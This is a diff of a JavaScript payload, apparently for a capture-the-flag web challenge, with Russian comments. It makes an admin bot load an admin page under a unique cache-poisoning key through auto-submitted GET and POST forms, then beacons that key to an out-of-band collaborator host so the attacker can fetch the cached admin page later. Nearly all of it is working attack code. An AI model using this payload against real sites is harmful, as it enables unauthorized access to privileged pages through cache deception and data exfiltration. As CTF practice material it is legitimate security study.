@@ -2,17 +2,26 @@
 <script>
 const TARGET = 'https://tasks.goidactf.ru:20431';
 const CACHE_KEY = 'cache_poison_' + Math.random().toString(36).substr(2);
+const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// 1. Бот посещает админку с уникальным параметром
-fetch(TARGET + '/admin?' + CACHE_KEY, {
-    credentials: 'include'
-}).then(() => {
-    // 2. Отправляем тебе ключ через коллаборатор
-    fetch('https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?cache_key=' + CACHE_KEY, {
-        mode: 'no-cors'
-    });
-    
-    // 3. Ты потом заходишь на тот же URL
-    // https://tasks.goidactf.ru:20431/admin?cache_poison_xxxx
-});
+// 1. Бот посещает админку с уникальным параметром через форму
+const form = document.createElement('form');
+form.method = 'GET';
+form.action = TARGET + '/admin?' + CACHE_KEY;
+form.target = '_blank';
+form.innerHTML = '<input type="hidden" name="cache_key" value="' + CACHE_KEY + '">';
+document.body.appendChild(form);
+form.submit();
+
+// 2. Отправляем ключ через Image (без CORS)
+new Image().src = COLLAB + '/?cache_key=' + CACHE_KEY;
+
+// 3. Также пробуем POST запрос с параметром
+const postForm = document.createElement('form');
+postForm.method = 'POST';
+postForm.action = TARGET + '/admin?' + CACHE_KEY + '&method=post';
+postForm.target = '_blank';
+postForm.innerHTML = '<input type="hidden" name="test" value="post_cache">';
+document.body.appendChild(postForm);
+postForm.submit();
 </script>
